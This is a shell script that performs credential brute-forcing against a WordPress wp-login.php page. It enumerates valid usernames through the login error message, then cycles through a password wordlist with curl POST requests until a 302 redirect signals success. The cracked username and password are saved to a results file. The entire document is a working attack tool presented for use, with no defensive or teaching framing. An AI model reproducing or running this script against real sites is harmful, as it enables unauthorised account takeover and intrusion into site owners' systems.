#!/bin/sh
# Bruteforce single Wordpress
# Created: 19-06-2021
# Script Author : Chi Vo
# Usage: sh wordpress.sh http://localhost/wp-login.php user.txt pass.txt

check_login_form() {
	TARGET=$1
	printf "${YELLOW}Check site live ..."
	echo
	response=$(curl -kis -X POST "$TARGET" -d "log=&pwd=" | grep "loginform" | wc -l)
	if [ $response -gt 0 ]
	then
		printf "${LIGHTGREEN}Target Ok ${NC}"
		echo
	else
		printf "${RED}Target didn't work !\n"
		echo
		exit
	fi
}

crack_pass() {
	TARGET=$1
	USER=$2
	PASS_LIST=$3
	while read p; do
		printf "Trying user ${LIGHTGREEN} $USER ${NC} with pass: ${YELLOW} $p ${NC}"
		echo
		response=$(curl -kis -X POST "$TARGET" -d "log=$USER&pwd=$p" | grep "302 Found" | wc -l)
		if [ $response = 1 ]; then
			printf "${LIGHTGREEN}Pass Found: $p"
			echo
			PASSWORD=$p
			break
		fi
	done <$PASS_LIST
	if [ ! "$PASSWORD" ]; then
		printf "${RED}Password not found with username: $USERCRACKED"
		echo
		exit
	fi
}

crack_user() {
	TARGET=$1
	USER_LIST=$2
	while read u; do
		echo "Trying user: $u"
		response=$(curl -kis -X POST "$TARGET" -d "log=$u&pwd=admin" | grep "Unknown username" | wc -l)
		if [ $response = 0 ]; then
			printf "${LIGHTGREEN}User Found: $u ${NC}"
			echo
			USERCRACKED=$u
			break
		fi
	done <$USER_LIST
	if [ ! "$USERCRACKED" ]; then
		printf "${RED}User not found"
		echo
		exit
	fi
}

usage() {
	printf "Usage: ${YELLOW}sh $0 http://localhost/wp-login.php user.txt pass.txt"
	echo
}

# Color
LIGHTRED='\033[1;31m'
RED='\033[0;31m'
GREEN='\033[0;32m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET=$1
USER_LIST=$2
PASS_LIST=$3

if [ ! "$TARGET" ]; then
	usage
	exit
fi
if [ ! "$USER_LIST" ]; then
	usage
	exit
fi
if [ ! "$PASS_LIST" ]; then
	usage
	exit
fi

echo "Cracking target : $TARGET"
check_login_form $TARGET
crack_user $TARGET $USER_LIST
crack_pass $TARGET $USERCRACKED $PASS_LIST
echo
printf "${LIGHTGREEN}Cracked Successfully! \n"
echo "User: $USERCRACKED"
echo "Pass: $PASSWORD"
echo "$TARGET|$USERCRACKED|$PASSWORD" >result.txt
